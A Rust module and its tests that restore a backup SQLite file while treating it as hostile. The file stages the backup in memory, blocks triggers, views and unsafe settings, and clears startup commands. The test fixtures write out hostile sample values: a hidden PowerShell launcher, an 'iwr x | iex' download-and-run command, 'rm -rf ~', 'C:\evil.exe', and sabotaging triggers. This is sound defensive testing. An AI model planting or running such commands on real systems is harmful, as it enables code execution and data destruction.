//! Restoring a backup `.db`: a row import into the live database, never a copy
//! of the file over it.
//!
//! SECURITY: a `.db` looks like data, carries no mark of the web, and gets none
//! of the friction an `.exe` would, so "restore the team's backup" is a
//! plausible thing to be talked into. Everything here treats the chosen file as
//! hostile.
//!
//! The restore used to page-copy the whole file over the live database and then
//! take back what it did not trust. That ordering was the bug: by the time the
//! clean-up ran, the file's *schema* was the live schema, so its own triggers got
//! a vote on the clean-up (a `BEFORE DELETE ... RAISE(IGNORE)` made it delete
//! nothing), and a file that made the clean-up error left itself live and
//! unswept, because the copy had already committed.
//!
//! So the file's schema never becomes the live schema at all:
//!
//! 1. The file is opened read-only and copied into a throwaway in-memory
//!    database (the *stage*) with triggers switched off, defensive mode on and
//!    an untrusted schema. The normal migrations run there, so a backup from an
//!    older build is brought up to date exactly as it was before.
//! 2. Every table read from the stage must be a plain table there. A view, or a
//!    virtual table, under one of our names rejects the whole file.
//! 3. Inside one transaction on the live connection, which Broadside migrated
//!    itself and the file has never touched, each restored table is emptied and
//!    refilled row by row with an explicit column list taken from the *live*
//!    schema. Any error anywhere drops the transaction, and the live database
//!    is exactly what it was before the operator chose Restore.
//!
//! What is restored, and why each is safe to take from a file:
//!
//! - `hosts`, `command_history`, `broadcast_results`, `pty_dispatch_results`,
//!   `omni_blocks`: read as data, shown as text, never executed. A planted row
//!   here is a line in a list. (A restored host pointing somewhere unexpected
//!   still meets the host-key check before any credential is sent.)
//! - `skills`: a skill's text does get typed at a host, but never without
//!   passing the destructive guard and the operator's own confirmation on the
//!   way (see `commands::skills::run_skill`).
//! - `templates`: an ordered list of sessions to open. A host item is a
//!   reference that meets the same host-key check, and a profile item opens a
//!   profile whose startup command was cleared below.
//! - `shell_profiles`: restored, but a profile's `startup_command` is typed into
//!   a local shell on the next click with nothing guarding it, so every one is
//!   emptied. A profile naming a custom local shell is re-pointed at
//!   [`UNMATCHED_CUSTOM`] (see below).
//! - `settings`: only the keys in [`SETTINGS_RESTORED`], which are preferences.
//!   Every other key keeps the value this machine already has, whatever the
//!   file says (see that list for what is held back and why).
//!
//! What is never read from the file at all:
//!
//! - `custom_terminals` names a program to spawn, and a hostile row is shaped
//!   exactly like a legitimate one (`powershell.exe` with arguments), so no
//!   validation could tell them apart. The live entries are left as they are.
//! - `host_keys` is the record of which key the operator agreed to trust for
//!   which host. From a file somebody else made, it would pre-trust that
//!   person's keys and the TOFU and key-mismatch dialogs would never fire. The
//!   live keys are left as they are; a restored host this machine has never
//!   trusted asks on its first connect.
//!
//! Because neither table is copied, there is nothing to delete afterwards and
//! nothing for a hostile trigger to sabotage.
//!
//! [`UNMATCHED_CUSTOM`]: crate::db::shell_profiles::UNMATCHED_CUSTOM

use std::path::Path;

use rusqlite::config::DbConfig;
use rusqlite::types::Value;
use rusqlite::{Connection, OpenFlags, TransactionBehavior};

use crate::error::{AppError, AppResult};

/// The tables a restore empties and refills from the file, in this order.
const TABLES_RESTORED: &[&str] = &[
    "hosts",
    "command_history",
    "broadcast_results",
    "pty_dispatch_results",
    "omni_blocks",
    "skills",
    "templates",
    "shell_profiles",
];

/// The settings a restore takes from the file. An allowlist, so a key added
/// later stays on this machine until somebody decides it is a preference.
///
/// Held back on purpose, each keeping the live value:
/// - `sudo_autofill_enabled`: whether stored passwords get typed into a session
///   on the host's say-so. The passwords are the ones already on this machine,
///   so a file switching it on would be turning injection on for credentials it
///   never had to supply.
/// - `history_scrub_enabled` and `skill_log_where`: both decide what Broadside
///   does to a remote host's shell history, which is a write to somebody else's
///   machine and the operator's call, not a file's.
/// - `audit_enabled`: a file should not be able to switch the audit log off.
/// - `shortcut_commands`: commands typed into a shell from a button.
/// - `admin_lock_hash`, `admin_lock_recovery_hash`: the passcode lock belongs
///   to this machine's operator.
/// - `shell_profiles_legacy_imported`: bookkeeping about this machine's own
///   localStorage, which a file knows nothing about.
///
/// `guard_user_rules` is restored: user rules only ever *add* blocks
/// ([`crate::guard::check_with_user`] runs every core rule first), so a file
/// can drop the operator's extra rules but cannot unblock anything the core
/// rules catch.
const SETTINGS_RESTORED: &[&str] = &[
    "guard_user_rules",
    "local_probe",
    "max_concurrent_sessions",
    "default_timeout_secs",
    "bulk_confirm_over",
    "help_hints_enabled",
    "terminal_font_family",
    "terminal_font_size",
    "app_font_size",
    "terminal_scrollback",
    "skill_log_detail",
    "skill_log_format",
];

/// What a restore did that the operator has to know about.
#[derive(Debug)]
pub struct Restored {
    pub host_count: usize,
    /// Shell profiles whose startup command was emptied.
    pub cleared_startup_commands: usize,
    /// Shell profiles that named a custom local shell and now name none.
    pub orphaned_custom_profiles: usize,
}

/// Replaces the restorable parts of `live` with the backup at `src_path`.
///
/// All or nothing: on any error the live database is unchanged.
#[cfg(test)]
pub fn restore_from_file(live: &Connection, src_path: &Path) -> AppResult<Restored> {
    let stage = stage(src_path)?;
    import(live, &stage)
}

/// Copies the file into a private in-memory database and migrates it there.
/// Nothing the file contains ever runs against the live connection, which is
/// also why this needs no lock on it: call it before taking one.
pub fn stage(src_path: &Path) -> AppResult<Connection> {
    let src = Connection::open_with_flags(src_path, OpenFlags::SQLITE_OPEN_READ_ONLY)
        .map_err(|e| AppError::InvalidInput(format!("can't open backup file: {e}")))?;
    distrust(&src)?;
    let ok: String = src
        .query_row("PRAGMA quick_check(1)", [], |r| r.get(0))
        .map_err(|e| AppError::InvalidInput(format!("can't read backup file: {e}")))?;
    if ok != "ok" {
        return Err(AppError::InvalidInput(
            "this backup file is damaged and was not restored".into(),
        ));
    }
    if object_type(&src, "hosts")?.as_deref() != Some("table") {
        return Err(AppError::InvalidInput(
            "this file is not a Broadside backup (no hosts table found)".into(),
        ));
    }

    let mut stage = Connection::open_in_memory()?;
    distrust(&stage)?;
    {
        let copy = rusqlite::backup::Backup::new(&src, &mut stage)?;
        copy.run_to_completion(64, std::time::Duration::from_millis(0), None)?;
    }
    crate::db::bootstrap(&stage).map_err(|e| {
        AppError::InvalidInput(format!(
            "this backup could not be brought up to this version: {e}"
        ))
    })?;
    Ok(stage)
}

/// Settings for a connection holding a file somebody else wrote: no triggers
/// fire, schema objects may not call functions with side effects, and the
/// file cannot use the writable-schema escape hatches.
fn distrust(conn: &Connection) -> AppResult<()> {
    conn.set_db_config(DbConfig::SQLITE_DBCONFIG_ENABLE_TRIGGER, false)?;
    conn.set_db_config(DbConfig::SQLITE_DBCONFIG_DEFENSIVE, true)?;
    conn.pragma_update(None, "trusted_schema", false)?;
    Ok(())
}

/// `table`, `view`, `virtual` or `shadow` for a name in `main`, or None.
fn object_type(conn: &Connection, name: &str) -> AppResult<Option<String>> {
    use rusqlite::OptionalExtension;
    Ok(conn
        .query_row(
            "SELECT type FROM pragma_table_list WHERE schema = 'main' AND name = ?1 COLLATE NOCASE",
            [name],
            |r| r.get(0),
        )
        .optional()?)
}

fn quote(ident: &str) -> String {
    format!("\"{}\"", ident.replace('"', "\"\""))
}

/// The live table's columns, in order. Taken from the live schema, never the
/// file's, so the file decides nothing about what is read or written.
fn live_columns(conn: &Connection, table: &str) -> AppResult<Vec<String>> {
    let mut stmt = conn.prepare(&format!("PRAGMA main.table_info({})", quote(table)))?;
    let cols = stmt
        .query_map([], |r| r.get::<_, String>(1))?
        .collect::<Result<Vec<_>, _>>()?;
    if cols.is_empty() {
        return Err(AppError::State(format!("live table {table} is missing")));
    }
    Ok(cols)
}

/// Copies the rows of `table` that match `filter` (a WHERE clause over the
/// stage) from the stage into the live table, column by
/// column.
fn copy_rows(live: &Connection, stage: &Connection, table: &str, filter: &str) -> AppResult<usize> {
    let cols = live_columns(live, table)?;
    let list = cols.iter().map(|c| quote(c)).collect::<Vec<_>>().join(", ");
    let marks = vec!["?"; cols.len()].join(", ");
    let mut read = stage.prepare(&format!(
        "SELECT {list} FROM main.{} {filter}",
        quote(table)
    ))?;
    let mut write = live.prepare(&format!(
        "INSERT INTO main.{} ({list}) VALUES ({marks})",
        quote(table)
    ))?;
    let mut rows = read.query([])?;
    let mut n = 0;
    while let Some(row) = rows.next()? {
        let values = (0..cols.len())
            .map(|i| row.get::<_, Value>(i))
            .collect::<Result<Vec<_>, _>>()?;
        write.execute(rusqlite::params_from_iter(values))?;
        n += 1;
    }
    Ok(n)
}

/// Replaces the restorable parts of `live` with the rows of a [`stage`]d
/// backup. All or nothing: on any error the live database is unchanged.
pub fn import(live: &Connection, stage: &Connection) -> AppResult<Restored> {
    // Every table read below must be a real table in the stage. Migrating the
    // stage created any that an older file lacked, so a missing one here, or a
    // view or virtual table under the name, is a file built to be odd.
    for table in TABLES_RESTORED.iter().chain(["settings"].iter()) {
        if object_type(stage, table)?.as_deref() != Some("table") {
            return Err(AppError::InvalidInput(format!(
                "this backup's {table} is not a table, so the file was not restored"
            )));
        }
    }

    // Dropped without a commit on any early return, which rolls everything back.
    let tx = rusqlite::Transaction::new_unchecked(live, TransactionBehavior::Immediate)?;

    for table in TABLES_RESTORED {
        tx.execute(&format!("DELETE FROM main.{}", quote(table)), [])?;
        copy_rows(&tx, stage, table, "")?;
    }

    let keys = SETTINGS_RESTORED
        .iter()
        .map(|k| format!("'{k}'"))
        .collect::<Vec<_>>()
        .join(", ");
    tx.execute(
        &format!("DELETE FROM main.settings WHERE key IN ({keys})"),
        [],
    )?;
    copy_rows(&tx, stage, "settings", &format!("WHERE key IN ({keys})"))?;

    let cleared_startup_commands = tx.execute(
        "UPDATE main.shell_profiles SET startup_command = '' WHERE startup_command <> ''",
        [],
    )?;
    // The custom terminals a profile named are the file's, which were not
    // restored, and the id it holds would otherwise point at whichever of this
    // machine's own entries happens to have that number. The names are read
    // from the stage, the last place they exist.
    let orphaned_custom_profiles = crate::db::shell_profiles::orphan_custom_shells(&tx, stage)?;

    // The app must be able to read back what was imported. A row that fits the
    // columns but not the code (a port that is not a number, say) is found here,
    // while it can still be rolled back, rather than on the page that reloads.
    let host_count = crate::db::hosts::list_all(&tx)?.len();
    crate::db::shell_profiles::list(&tx)?;
    crate::db::templates::list(&tx)?;
    crate::db::skills::list(&tx)?;
    // Broadcast and skill runs refuse to start when the user guard rules do
    // not parse, so a file carrying unreadable ones is refused here instead.
    crate::commands::settings::load_user_rules(&tx)?;

    tx.commit()?;
    Ok(Restored {
        host_count,
        cleared_startup_commands,
        orphaned_custom_profiles,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::db::hosts::{self as host_repo, HostInput};
    use crate::db::open_in_memory;
    use crate::db::shell_profiles::{self as profiles, ShellProfileInput};

    fn host(label: &str, hostname: &str) -> HostInput {
        HostInput {
            label: label.into(),
            hostname: hostname.into(),
            port: 22,
            username: "ops".into(),
            color: "#3b82f6".into(),
            tag: None,
            linux_flavor: None,
            notes: None,
        }
    }

    fn profile(label: &str, shell: &str, startup: &str) -> ShellProfileInput {
        ShellProfileInput {
            label: label.into(),
            shell_id: shell.into(),
            cwd: String::new(),
            startup_command: startup.into(),
            color: String::new(),
            wanted_shell: String::new(),
        }
    }

    fn count(conn: &Connection, sql: &str) -> i64 {
        conn.query_row(sql, [], |r| r.get(0)).unwrap()
    }

    /// Writes `conn` to a file the way a backup does and returns its path.
    fn to_file(conn: &Connection, dir: &tempfile::TempDir) -> std::path::PathBuf {
        let path = dir.path().join("backup.db");
        conn.execute("VACUUM INTO ?1", [path.to_str().unwrap()])
            .unwrap();
        path
    }

    /// A live database with something of the operator's own in every table a
    /// restore leaves alone, so a test can see it is still there.
    fn live_db() -> Connection {
        let live = open_in_memory().unwrap();
        host_repo::create(&live, host("current", "192.168.1.1")).unwrap();
        live.execute(
            "INSERT INTO custom_terminals
                 (id, label, exe_path, args_json, family, sort_order, created_at, updated_at)
             VALUES (1, 'My Git Bash', 'C:\\bash.exe', '[]', 'posix', 0, 'then', 'then')",
            [],
        )
        .unwrap();
        live.execute(
            "INSERT INTO host_keys
                 (hostname, port, key_type, public_key, fingerprint_sha256, first_seen, last_seen)
             VALUES ('192.168.1.1', 22, 'ssh-ed25519', 'AAAA', 'SHA256:mine', 'then', 'then')",
            [],
        )
        .unwrap();
        crate::db::settings::set(&live, "admin_lock_hash", "live-lock").unwrap();
        crate::db::settings::set(&live, "sudo_autofill_enabled", "false").unwrap();
        live
    }

    /// Everything a database holds, as text, to show one is unchanged.
    fn dump(conn: &Connection) -> Vec<String> {
        let mut out = Vec::new();
        let mut tables = conn
            .prepare("SELECT name, sql FROM sqlite_master ORDER BY name")
            .unwrap();
        let rows: Vec<(String, Option<String>)> = tables
            .query_map([], |r| Ok((r.get(0)?, r.get(1)?)))
            .unwrap()
            .collect::<Result<_, _>>()
            .unwrap();
        for (name, sql) in rows {
            out.push(format!("{name}: {sql:?}"));
            if sql
                .as_deref()
                .is_some_and(|s| s.starts_with("CREATE TABLE"))
            {
                let mut stmt = conn
                    .prepare(&format!("SELECT * FROM {} ORDER BY rowid", quote(&name)))
                    .unwrap();
                let n = stmt.column_count();
                let mut rows = stmt.query([]).unwrap();
                while let Some(row) = rows.next().unwrap() {
                    let vals: Vec<String> = (0..n)
                        .map(|i| format!("{:?}", row.get::<_, Value>(i).unwrap()))
                        .collect();
                    out.push(vals.join("|"));
                }
            }
        }
        out
    }

    #[test]
    fn restore_overwrites_live_data_from_snapshot() {
        let src = open_in_memory().unwrap();
        host_repo::create(&src, host("from-backup", "10.0.0.9")).unwrap();
        let dir = tempfile::tempdir().unwrap();
        let file = to_file(&src, &dir);

        let live = live_db();
        let report = restore_from_file(&live, &file).unwrap();

        assert_eq!(report.host_count, 1);
        let hosts = host_repo::list_all(&live).unwrap();
        assert_eq!(hosts.len(), 1);
        assert_eq!(hosts[0].label, "from-backup");
    }

    /// The two tables a restore must not carry over, because in each a row is
    /// a decision the operator never made: a program to spawn, and a host key
    /// already agreed to. Neither is read from the file, and the operator's own
    /// rows are not touched.
    #[test]
    fn a_restored_file_cannot_plant_a_launcher_entry_or_a_trusted_key() {
        let src = open_in_memory().unwrap();
        host_repo::create(&src, host("from-backup", "10.0.0.9")).unwrap();
        src.execute(
            "INSERT INTO custom_terminals
                 (id, label, exe_path, args_json, family, sort_order, created_at, updated_at)
             VALUES (7, 'PowerShell 7',
                     'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
                     '[\"-nop\",\"-w\",\"hidden\",\"-c\",\"whoami\"]',
                     'powershell', 0, 'then', 'then')",
            [],
        )
        .unwrap();
        src.execute(
            "INSERT INTO host_keys
                 (hostname, port, key_type, public_key, fingerprint_sha256, first_seen, last_seen)
             VALUES ('10.0.0.9', 22, 'ssh-ed25519', 'AAAA', 'SHA256:not-the-real-host', 'then', 'then')",
            [],
        )
        .unwrap();
        crate::db::settings::set(&src, "sudo_autofill_enabled", "true").unwrap();
        let dir = tempfile::tempdir().unwrap();
        let file = to_file(&src, &dir);

        let live = live_db();
        restore_from_file(&live, &file).unwrap();

        let terminals = crate::db::custom_terminals::list(&live).unwrap();
        assert_eq!(terminals.len(), 1, "only the operator's own entry");
        assert_eq!(terminals[0].label, "My Git Bash");
        assert_eq!(
            count(
                &live,
                "SELECT COUNT(*) FROM host_keys WHERE fingerprint_sha256 = 'SHA256:mine'"
            ),
            1
        );
        assert_eq!(count(&live, "SELECT COUNT(*) FROM host_keys"), 1);
        assert!(
            !crate::db::settings::get_bool(&live, "sudo_autofill_enabled", true).unwrap(),
            "the file cannot switch password injection on"
        );
        assert_eq!(host_repo::list_all(&live).unwrap()[0].label, "from-backup");
    }

    /// The bypass of the old sweep: triggers that make a DELETE or UPDATE do
    /// nothing. They never reach the live database, and none of the tables
    /// they guard is read from the file anyway.
    #[test]
    fn restore_rejects_or_ignores_a_hostile_trigger() {
        let src = open_in_memory().unwrap();
        host_repo::create(&src, host("from-backup", "10.0.0.9")).unwrap();
        profiles::create(&src, "p-1", &profile("dev", "pwsh", "iwr x | iex"), None).unwrap();
        src.execute(
            "INSERT INTO custom_terminals
                 (id, label, exe_path, args_json, family, sort_order, created_at, updated_at)
             VALUES (7, 'PowerShell 7', 'C:\\evil.exe', '[]', 'powershell', 0, 'then', 'then')",
            [],
        )
        .unwrap();
        src.execute_batch(
            "CREATE TRIGGER t1 BEFORE DELETE ON custom_terminals BEGIN SELECT RAISE(IGNORE); END;
             CREATE TRIGGER t2 BEFORE DELETE ON host_keys BEGIN SELECT RAISE(IGNORE); END;
             CREATE TRIGGER t3 BEFORE UPDATE ON shell_profiles BEGIN SELECT RAISE(IGNORE); END;
             CREATE TRIGGER t4 BEFORE DELETE ON hosts BEGIN SELECT RAISE(IGNORE); END;",
        )
        .unwrap();
        let dir = tempfile::tempdir().unwrap();
        let file = to_file(&src, &dir);

        let live = live_db();
        let report = restore_from_file(&live, &file).unwrap();

        assert_eq!(
            count(
                &live,
                "SELECT COUNT(*) FROM sqlite_master WHERE type = 'trigger'"
            ),
            0,
            "no trigger crossed over"
        );
        assert_eq!(
            count(
                &live,
                "SELECT COUNT(*) FROM custom_terminals WHERE exe_path = 'C:\\evil.exe'"
            ),
            0
        );
        assert_eq!(report.cleared_startup_commands, 1);
        assert_eq!(profiles::get(&live, "p-1").unwrap().startup_command, "");
    }

    /// A view under one of our names. Where the table is never read
    /// (`custom_terminals`) it is simply ignored; where it would be, the whole
    /// file is refused and nothing changes.
    #[test]
    fn restore_rejects_a_view_impersonating_a_table() {
        let dir = tempfile::tempdir().unwrap();

        // The reproducer from the review: custom_terminals as a view, with a
        // current user_version so no migration notices.
        let src = open_in_memory().unwrap();
        host_repo::create(&src, host("from-backup", "10.0.0.9")).unwrap();
        src.execute_batch(
            "DROP TABLE custom_terminals;
             CREATE VIEW custom_terminals AS
                 SELECT 1 AS id, 'PowerShell 7' AS label, 'C:\\evil.exe' AS exe_path,
                        '[]' AS args_json, 'powershell' AS family, 0 AS sort_order,
                        'then' AS created_at, 'then' AS updated_at;",
        )
        .unwrap();
        let file = to_file(&src, &dir);
        let live = live_db();
        restore_from_file(&live, &file).unwrap();
        assert_eq!(
            count(
                &live,
                "SELECT COUNT(*) FROM sqlite_master WHERE type = 'view'"
            ),
            0
        );
        let terminals = crate::db::custom_terminals::list(&live).unwrap();
        assert_eq!(terminals.len(), 1);
        assert_eq!(terminals[0].exe_path, "C:\\bash.exe");

        // And a table that is read, as a view: refused, live untouched.
        let dir = tempfile::tempdir().unwrap();
        let src = open_in_memory().unwrap();
        host_repo::create(&src, host("from-backup", "10.0.0.9")).unwrap();
        src.execute_batch(
            "DROP TABLE skills;
             CREATE VIEW skills AS SELECT 1 AS id, 'x' AS name, '' AS description,
                 NULL AS icon, 'k' AS kind, '{}' AS config_json, 0 AS sort_order,
                 'then' AS created_at, 'then' AS updated_at;",
        )
        .unwrap();
        let file = to_file(&src, &dir);
        let live = live_db();
        let before = dump(&live);
        let err = restore_from_file(&live, &file).unwrap_err();
        assert!(err.to_string().contains("skills is not a table"), "{err}");
        assert_eq!(dump(&live), before);
    }

    /// An error partway through the import leaves the live database exactly
    /// as it was: not the file's schema, and not a half-copied mix.
    #[test]
    fn restore_rolls_back_fully_on_any_failure() {
        let src = open_in_memory().unwrap();
        host_repo::create(&src, host("from-backup", "10.0.0.9")).unwrap();
        // A null in a column the live schema holds NOT NULL. `hosts` is copied
        // first and succeeds; this fails later, inside the same transaction.
        src.execute_batch(
            "DROP TABLE omni_blocks;
             CREATE TABLE omni_blocks (
                 id INTEGER PRIMARY KEY, ts TEXT, host_id INTEGER, label TEXT,
                 command TEXT, lines TEXT, exit_code INTEGER, duration_ms INTEGER,
                 interactivity TEXT);
             INSERT INTO omni_blocks (ts, label, lines, interactivity)
                 VALUES ('then', NULL, '[]', 'none');",
        )
        .unwrap();
        let dir = tempfile::tempdir().unwrap();
        let file = to_file(&src, &dir);

        let live = live_db();
        let before = dump(&live);
        assert!(restore_from_file(&live, &file).is_err());
        assert_eq!(dump(&live), before);
        assert_eq!(host_repo::list_all(&live).unwrap()[0].label, "current");
    }

    /// A file whose migrations fail (a column a later migration adds, already
    /// there under an old user_version) is refused before the live database
    /// is touched. This one used to leave the unswept file live.
    #[test]
    fn a_file_that_cannot_be_migrated_changes_nothing() {
        let src = open_in_memory().unwrap();
        src.pragma_update(None, "user_version", 0).unwrap();
        let dir = tempfile::tempdir().unwrap();
        let file = to_file(&src, &dir);

        let live = live_db();
        let before = dump(&live);
        let err = restore_from_file(&live, &file).unwrap_err();
        assert!(
            err.to_string().contains("brought up to this version"),
            "{err}"
        );
        assert_eq!(dump(&live), before);
    }

    #[test]
    fn restore_settings_only_carries_allowlisted_keys() {
        let src = open_in_memory().unwrap();
        for (k, v) in [
            ("admin_lock_hash", "file-lock"),
            ("admin_lock_recovery_hash", "file-recovery"),
            (
                "shortcut_commands",
                "[{\"label\":\"x\",\"command\":\"rm -rf ~\"}]",
            ),
            ("sudo_autofill_enabled", "true"),
            ("history_scrub_enabled", "true"),
            ("audit_enabled", "false"),
            ("terminal_font_size", "18"),
            ("guard_user_rules", "[]"),
        ] {
            crate::db::settings::set(&src, k, v).unwrap();
        }
        let dir = tempfile::tempdir().unwrap();
        let file = to_file(&src, &dir);

        let live = live_db();
        crate::db::settings::set(&live, "shortcut_commands", "[]").unwrap();
        crate::db::settings::set(&live, "terminal_font_size", "12").unwrap();
        crate::db::settings::set(&live, "app_font_size", "14").unwrap();
        restore_from_file(&live, &file).unwrap();

        let get = |k: &str| crate::db::settings::get(&live, k).unwrap();
        assert_eq!(get("admin_lock_hash").as_deref(), Some("live-lock"));
        assert_eq!(get("admin_lock_recovery_hash"), None);
        assert_eq!(get("shortcut_commands").as_deref(), Some("[]"));
        assert_eq!(get("sudo_autofill_enabled").as_deref(), Some("false"));
        assert_eq!(get("history_scrub_enabled"), None);
        assert_eq!(get("audit_enabled"), None);
        assert_eq!(
            get("terminal_font_size").as_deref(),
            Some("18"),
            "a preference comes back"
        );
        assert_eq!(get("guard_user_rules").as_deref(), Some("[]"));
        assert_eq!(
            get("app_font_size"),
            None,
            "restored means as the file had it"
        );
    }

    /// A profile naming a custom terminal is left pointing at nothing, keeping
    /// the name the file gave that terminal: the file's terminals are not
    /// restored, and `custom:1` would otherwise open this machine's entry 1.
    #[test]
    fn a_profile_naming_a_custom_terminal_is_left_pointing_at_nothing() {
        let src = open_in_memory().unwrap();
        profiles::create(
            &src,
            "p-1",
            &profile("Git Bash at work", "custom:1", ""),
            None,
        )
        .unwrap();
        profiles::create(&src, "p-2", &profile("Also custom", "custom:12", ""), None).unwrap();
        profiles::create(&src, "p-3", &profile("Plain pwsh", "pwsh", ""), None).unwrap();
        src.execute(
            "INSERT INTO custom_terminals
                 (id, label, exe_path, args_json, family, sort_order, created_at, updated_at)
             VALUES (1, 'Git Bash', 'C:\\bash.exe', '[]', 'posix', 0, 'then', 'then')",
            [],
        )
        .unwrap();
        let dir = tempfile::tempdir().unwrap();
        let file = to_file(&src, &dir);

        let live = live_db();
        let report = restore_from_file(&live, &file).unwrap();
        assert_eq!(report.orphaned_custom_profiles, 2);

        let p1 = profiles::get(&live, "p-1").unwrap();
        assert_eq!(p1.shell_id, profiles::UNMATCHED_CUSTOM);
        assert_eq!(p1.wanted_shell, "Git Bash");
        let p2 = profiles::get(&live, "p-2").unwrap();
        assert_eq!(p2.shell_id, profiles::UNMATCHED_CUSTOM);
        assert_eq!(p2.wanted_shell, "", "id 12 was not in the file");
        assert_eq!(profiles::get(&live, "p-3").unwrap().shell_id, "pwsh");
    }

    /// A backup from an older build is migrated on the way in, as before.
    #[test]
    fn an_old_backup_is_brought_up_to_date() {
        let src = Connection::open_in_memory().unwrap();
        for sql in crate::db::MIGRATIONS.iter().take(14) {
            src.execute_batch(sql).unwrap();
        }
        src.pragma_update(None, "user_version", 14).unwrap();
        src.execute(
            "INSERT INTO hosts (label, hostname, port, username, color, created_at, updated_at, login_shell)
             VALUES ('old', '10.0.0.1', 22, 'ops', '#fff', 'then', 'then', 'Welcome to my box')",
            [],
        )
        .unwrap();
        let dir = tempfile::tempdir().unwrap();
        let file = to_file(&src, &dir);

        let live = live_db();
        restore_from_file(&live, &file).unwrap();
        let hosts = host_repo::list_all(&live).unwrap();
        assert_eq!(hosts.len(), 1);
        assert_eq!(hosts[0].label, "old");
        assert_eq!(
            count(
                &live,
                "SELECT COUNT(*) FROM hosts WHERE login_shell IS NULL"
            ),
            1,
            "migration 17's heal ran on the way in"
        );
    }

    #[test]
    fn a_file_without_a_hosts_table_is_refused() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("other.db");
        Connection::open(&path)
            .unwrap()
            .execute_batch("CREATE TABLE notes (x TEXT);")
            .unwrap();
        let live = live_db();
        let err = restore_from_file(&live, &path).unwrap_err();
        assert!(err.to_string().contains("not a Broadside backup"), "{err}");
    }
}
